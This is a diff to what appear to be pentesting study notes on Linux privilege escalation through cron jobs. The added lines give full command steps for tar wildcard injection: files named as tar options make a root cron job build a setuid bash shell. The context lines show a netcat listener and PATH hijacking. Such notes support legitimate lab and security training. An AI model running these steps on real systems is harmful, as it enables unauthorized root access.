@@ -149,7 +149,6 @@ Privilege Escalation: Cron Jobs
     nc -lvnp 4444
     
     ; PATH Environment Variable
-    // victim
     cat /etc/crontab
         ; PATH=/home/victim:..
         ; * * * * * root backup.sh
@@ -158,6 +157,24 @@ Privilege Escalation: Cron Jobs
         cp /bin/bash /tmp/rootbash
         chmod +xs /tmp/rootbash
     chmod 777 backup.sh
+    /tmp/rootbash -p
+    
+    ; Wildcards
+    cat /etc/crontab
+        ; * * * * * root /usr/local/bin/compress.sh
+    cat /usr/local/bin/compress.sh
+        #!/bin/sh
+        cd /home/user
+        tar czf /tmp/backup.tar.gz *
+    https://gtfobins.github.io/gtfobins/tar/
+        ; tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+    vim wildcards.sh
+        #!/bin/bash
+        cp /bin/bash /tmp/rootbash
+        chmod +xs /tmp/rootbash
+    chmod 777 wildcards.sh
+    touch /home/user/--checkpoint=1
+    touch /home/user/--checkpoint-action=exec=wildcards.sh
     /tmp/rootbash -p
     
 Privilege Escalation: PATH
